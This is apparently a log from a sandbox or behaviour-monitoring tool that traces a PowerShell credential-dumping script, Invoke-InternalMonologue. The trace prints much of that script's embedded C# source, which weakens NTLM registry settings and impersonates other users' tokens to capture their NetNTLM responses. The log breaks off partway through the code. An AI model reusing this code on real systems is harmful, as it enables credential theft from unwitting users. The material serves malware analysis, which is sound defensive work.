
Finished starting job1,job2,job3,job4 -- Elapsed-Time: 0:00:00.015655

====================================================================================================
added pid 0 of                        background-process System Idle Process                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4 of                        background-process System                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 92 of                        background-process Registry                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 328 of                        background-process smss.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 440 of                        background-process csrss.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 448 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 516 of                        background-process wininit.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 552 of                        background-process csrss.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 612 of                        background-process winlogon.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 628 of                        background-process services.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 668 of                        background-process lsass.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 768 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 940 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1040 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1132 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1188 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1320 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1512 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1524 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1588 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1608 of                        background-process MemCompression                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1620 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1700 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1796 of                        background-process taskhostw.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1832 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2012 of                        background-process MsMpEng.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2084 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2228 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2296 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2420 of                        background-process spoolsv.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2500 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2668 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2676 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2724 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2772 of                        background-process sshd.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2796 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2856 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 3136 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 3172 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4060 of                        background-process provtool.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4112 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4188 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4296 of                        background-process conhost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4320 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4620 of                        background-process SecurityHealthService.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4628 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4752 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4868 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 5220 of                        background-process SearchIndexer.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 5676 of                        background-process MpCmdRun.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 5820 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 7544 of                        background-process TrustedInstaller.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 7744 of                        background-process TiWorker.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 8216 of                        background-process SgrmBroker.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 8840 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 9036 of                        background-process svchost.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 9132 of                        background-process uhssvc.exe                        with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 580 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 680 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1048 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1228 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1240 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1336 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1504 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1628 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1676 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1736 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1820 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1868 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1976 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1984 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2092 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2248 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2596 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2604 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2744 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2764 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2964 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 3292 of                        background-process dasHost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 3376 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 3500 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 5044 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 5084 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 5804 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 6876 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 7020 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 9172 of                        background-process svchost.exe                        with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 888 of                        background-process svchost.exe                        with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
added pid 1560 of                        background-process svchost.exe                        with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
added pid 1936 of                        background-process svchost.exe                        with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
added pid 1968 of                        background-process svchost.exe                        with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
added pid 2588 of                        background-process svchost.exe                        with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
added pid 2660 of                        background-process svchost.exe                        with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
added pid 3744 of                        background-process svchost.exe                        with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
====================================================================================================
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6


spawned_shell_process 8756's parent-process is indeed the main-python-process python3.10.exe : 2408


Finished Blacklisting Main-Python-Process 2408

PS C:\malware> Trace-Command -Name metadata, parameterbinding, cmdlet -Expression {. "C:\Users\puma-4\Downloads\PT-ToolKit-f78567ce9b4701acfd6af21196b95eef44bbc9c5\PowerShell-Scripts\Credential_Dumping\Invoke-InternalMonologue.ps1"; Invoke-InternalMonologue;} -PSHost;
DEBUG: ParameterBinding Information: 0 : BIND NAMED cmd line args [New-Object]
DEBUG: ParameterBinding Information: 0 :     BIND arg [System.CodeDom.Compiler.CompilerParameters] to parameter 
[TypeName]
DEBUG: ParameterBinding Information: 0 :         COERCE arg to [System.String]
DEBUG: ParameterBinding Information: 0 :             Parameter and arg types the same, no coercion is needed.
DEBUG: ParameterBinding Information: 0 :         Executing VALIDATION metadata: 
[System.Management.Automation.ValidateTrustedDataAttribute]
DEBUG: ParameterBinding Information: 0 :         BIND arg [System.CodeDom.Compiler.CompilerParameters] to param 
[TypeName] SUCCESSFUL
DEBUG: ParameterBinding Information: 0 : BIND POSITIONAL cmd line args [New-Object]
DEBUG: ParameterBinding Information: 0 : MANDATORY PARAMETER CHECK on cmdlet [New-Object]
DEBUG: ParameterBinding Information: 0 : CALLING BeginProcessing
DEBUG: ParameterBinding Information: 0 : CALLING EndProcessing

*SUSPENDED the spawned-powershell-process 8756 due to: 'DEBUG: ParameterBinding Information: 0 : CALLING EndProcessing
'

sleep now : for 300 seconds
wake up now : as 300 seconds past

Finished All Close-Traces-- Elapsed-Time: 0:00:00.109197

Started joinit for FILE
Finished joinit for FILE -- Elapsed-Time: 0:00:15.296729
Started joinit for REGISTRY
Finished joinit for REGISTRY -- Elapsed-Time: 0:00:09.078180
Started joinit for NETWORK
Finished joinit for NETWORK -- Elapsed-Time: 0:00:00
Started joinit for PROCESS
Finished joinit for PROCESS -- Elapsed-Time: 0:00:00

Finished starting job1,job2,job3,job4 -- Elapsed-Time: 0:00:00

====================================================================================================
added pid 0 of                                                background-process System Idle Process                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4 of                                                background-process System                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 92 of                                                background-process Registry                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 328 of                                                background-process smss.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 440 of                                                background-process csrss.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 448 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 516 of                                                background-process wininit.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 552 of                                                background-process csrss.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 612 of                                                background-process winlogon.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 628 of                                                background-process services.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 668 of                                                background-process lsass.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 768 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 896 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 940 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1040 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1132 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1188 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1320 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1512 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1524 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1588 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1608 of                                                background-process MemCompression                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1620 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1700 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1796 of                                                background-process taskhostw.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1832 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2012 of                                                background-process MsMpEng.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2084 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2228 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2296 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2420 of                                                background-process spoolsv.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2500 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2668 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2676 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2724 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2772 of                                                background-process sshd.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2796 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2856 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 3136 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 3172 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 3260 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 3856 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4188 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4296 of                                                background-process conhost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4320 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4620 of                                                background-process SecurityHealthService.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4628 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4752 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4868 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 5220 of                                                background-process SearchIndexer.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 5384 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 5676 of                                                background-process MpCmdRun.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 5820 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 7340 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 7416 of                                                background-process MoUsoCoreWorker.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 7544 of                                                background-process TrustedInstaller.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 7744 of                                                background-process TiWorker.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 8216 of                                                background-process SgrmBroker.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 8840 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 9036 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 9116 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 9132 of                                                background-process uhssvc.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 580 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 680 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1048 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1228 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1240 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1336 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1504 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1628 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1676 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1736 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1820 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1868 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1976 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1984 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2092 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2248 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2596 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2604 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2744 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2764 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2964 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 3292 of                                                background-process dasHost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 3376 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 3500 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 5044 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 5084 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 5804 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 6876 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 7020 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 9172 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 888 of                                                background-process svchost.exe                                                with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
added pid 1560 of                                                background-process svchost.exe                                                with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
added pid 1936 of                                                background-process svchost.exe                                                with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
added pid 1968 of                                                background-process svchost.exe                                                with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
added pid 2588 of                                                background-process svchost.exe                                                with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
added pid 2660 of                                                background-process svchost.exe                                                with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
added pid 3744 of                                                background-process svchost.exe                                                with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
added pid 7520 of                                                background-process WmiPrvSE.exe                                                with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
====================================================================================================

Finished Blacklisting Main-Python-Process 2408


*RESUMED the spwaned-powershell-process 8756

DEBUG: ParameterBinding Information: 0 :     BIND arg [using System;
using System.Security.Principal;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text.RegularExpressions;

namespace InternalMonologue
{
    public class Program
    {
        const int MAX_TOKEN_SIZE = 12288;

        struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_GROUPS
        {
            public int GroupCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public SID_AND_ATTRIBUTES[] Groups;
        };

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);

        [DllImport("kernel32.dll")]
        static extern IntPtr LocalFree(IntPtr hMem);

        [DllImport("secur32.dll", CharSet = CharSet.Auto)]
        static extern int AcquireCredentialsHandle(
            string pszPrincipal,
            string pszPackage,
            int fCredentialUse,
            IntPtr PAuthenticationID,
            IntPtr pAuthData,
            int pGetKeyFn,
            IntPtr pvGetKeyArgument,
            ref SECURITY_HANDLE phCredential,
            ref SECURITY_INTEGER ptsExpiry);

        [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int InitializeSecurityContext(
            ref SECURITY_HANDLE phCredential,
            IntPtr phContext,
            string pszTargetName,
            int fContextReq,
            int Reserved1,
            int TargetDataRep,
            IntPtr pInput,
            int Reserved2,
            out SECURITY_HANDLE phNewContext,
            out SecBufferDesc pOutput,
            out uint pfContextAttr,
            out SECURITY_INTEGER ptsExpiry);

        [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int InitializeSecurityContext(
            ref SECURITY_HANDLE phCredential,
            ref SECURITY_HANDLE phContext,  
            string pszTargetName,
            int fContextReq,
            int Reserved1,
            int TargetDataRep,
            ref SecBufferDesc SecBufferDesc,
            int Reserved2,
            out SECURITY_HANDLE phNewContext,
            out SecBufferDesc pOutput,
            out uint pfContextAttr,
            out SECURITY_INTEGER ptsExpiry);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            int DesiredAccess,
            ref IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenThreadToken(
            IntPtr ThreadHandle,
            int DesiredAccess,
            bool OpenAsSelf,
            ref IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(
            IntPtr TokenHandle,
            int TokenInformationClass,
            IntPtr TokenInformation,
            int TokenInformationLength,
            out int ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool DuplicateTokenEx(
            IntPtr hExistingToken,
            int dwDesiredAccess,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            int ImpersonationLevel,
            int dwTokenType,
            ref IntPtr phNewToken);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(
            IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle,
            IntPtr dwThreadId);

        private static void GetRegKey(string key, string name, out object result)
        {
            RegistryKey Lsa = Registry.LocalMachine.OpenSubKey(key);
            if (Lsa != null)
            {
                object value = Lsa.GetValue(name);
                if (value != null)
                {
                    result = value;
                    return;
                }
            }
            result = null;
        }

        private static void SetRegKey(string key, string name, object value)
        {
            RegistryKey Lsa = Registry.LocalMachine.OpenSubKey(key, true);
            if (Lsa != null)
            {
                if (value == null)
                {
                    Lsa.DeleteValue(name);
                }
                else
                {
                    Lsa.SetValue(name, value);
                }
            }
        }

        private static void ExtendedNTLMDowngrade(out object oldValue_LMCompatibilityLevel, out object 
oldValue_NtlmMinClientSec, out object oldValue_RestrictSendingNTLMTraffic)
        {
            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", out 
oldValue_LMCompatibilityLevel);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", 2);

            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", out 
oldValue_NtlmMinClientSec);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", 536870912);

            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", out 
oldValue_RestrictSendingNTLMTraffic);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", 0);
        }

        private static void NTLMRestore(object oldValue_LMCompatibilityLevel, object oldValue_NtlmMinClientSec, object 
oldValue_RestrictSendingNTLMTraffic)
        {
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", 
oldValue_LMCompatibilityLevel);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", 
oldValue_NtlmMinClientSec);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", 
oldValue_RestrictSendingNTLMTraffic);
        }

        //Retrieves the SID of a given token
        public static string GetLogonId(IntPtr token)
        {
            string SID = null;
            try
            {
                StringBuilder sb = new StringBuilder();
                int TokenInfLength = 1024;
                IntPtr TokenInformation = Marshal.AllocHGlobal(TokenInfLength);
                Boolean Result = GetTokenInformation(token, 1, TokenInformation, TokenInfLength, out TokenInfLength);
                if (Result)
                {
                    TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));

                    IntPtr pstr = IntPtr.Zero;
                    Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
                    SID = Marshal.PtrToStringAuto(pstr);
                    LocalFree(pstr);
                }

                Marshal.FreeHGlobal(TokenInformation);

                return SID;
            }
            catch 
            {
                CloseHandle(token);
                return null;
            }
        }

        public static void HandleProcess(Process process, string challenge, bool verbose)
        {
            try
            {
                var token = IntPtr.Zero;
                var dupToken = IntPtr.Zero;
                string SID = null;

                if (OpenProcessToken(process.Handle, 0x0008, ref token))
                {
                    //Get the SID of the token
                    SID = GetLogonId(token);
                    CloseHandle(token);

                    //Check if this user hasn't been handled yet
                    if (SID != null && authenticatedUsers.Contains(SID) == false)
                    {
                        if (OpenProcessToken(process.Handle, 0x0002, ref token))
                        {
                            var sa = new SECURITY_ATTRIBUTES();
                            sa.nLength = Marshal.SizeOf(sa);

                            DuplicateTokenEx(
                                token,
                                0x0002 | 0x0008,
                                ref sa,
                                (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                                (int)1,
                                ref dupToken);

                            CloseHandle(token);

                            try
                            {
                                using (WindowsImpersonationContext impersonatedUser = 
WindowsIdentity.Impersonate(dupToken))
                                {
                                    if (verbose == true) Console.WriteLine("Impersonated user " + 
WindowsIdentity.GetCurrent().Name);
                                    string result = InternalMonologueForCurrentUser(challenge);
                                    //Ensure it is a valid response and not blank
                                    if (result != null && result.Length > 0)
                                    {
                                        Console.WriteLine(result);
                                        authenticatedUsers.Add(SID);
                                    }
                                    else if (verbose == true) { Console.WriteLine("Got blank response for user " + 
